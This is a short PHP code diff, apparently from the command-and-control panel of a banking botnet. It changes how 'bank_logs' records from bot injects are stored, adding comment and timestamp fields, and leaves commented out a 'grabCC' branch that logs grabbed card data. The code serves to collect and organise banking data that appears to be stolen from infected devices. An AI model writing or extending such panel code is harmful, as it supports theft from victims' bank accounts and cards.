@@ -405,9 +405,10 @@ class bots_con
                 }
 
                 if (empty($nameInject)) {
-                    $statement = $connection->prepare("insert into bank_logs (inject_id, bot_id, application, logs)
-					value (?,?,?,?)");
-                    $statement->execute(array($idInject, $idbot, $application, $dataInjection));
+                    $statement = $connection->prepare("insert into bank_logs (inject_id, bot_id, application, logs, comment, created_at)
+					value (?,?,?,?,?,?)");
+                    $comment = '';
+                    $statement->execute(array($idInject, $idbot, $application, $dataInjection, $comment, date('Y-m-d H:i:s')));
                 } /*else if($nameInject=="grabCC"){
                 $statement = $connection->prepare("insert into logsCC (idinj, idbot, application, logs)
                 value ('$idInject','$idbot','$application','$dataInjection')");
